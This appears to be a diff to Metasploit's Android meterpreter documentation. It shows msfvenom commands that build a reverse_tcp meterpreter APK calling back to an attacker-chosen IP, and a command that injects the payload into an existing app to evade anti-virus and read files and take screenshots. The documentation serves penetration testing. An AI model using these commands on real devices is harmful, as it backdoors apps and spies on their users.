@@ -41,20 +41,23 @@ msf payload(reverse_tcp) > generate -t raw -f /tmp/android.apk
 msf payload(reverse_tcp) >
 ```
 
-To create the APK with msfvenom:
+### To create the APK with msfvenom:
 
 ```
 ./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
 
+### To inject meterpreter into an existing APK with msfvenom:
+
 You can also add Android meterpreter to any existing APK. This will make it harder for
 Anti-virus software to detect the payload, and allow you read internal files and take
-screenshots of the Android app you are backdooring:
-
+screenshots of the Android app that you are backdooring:
 
 ```
 ./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
+
+[Please see here for more documentation on Android injection](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/injection.md).
 
 
 Next, start an Android device. Upload the APK, and execute it. There are different ways to do this,
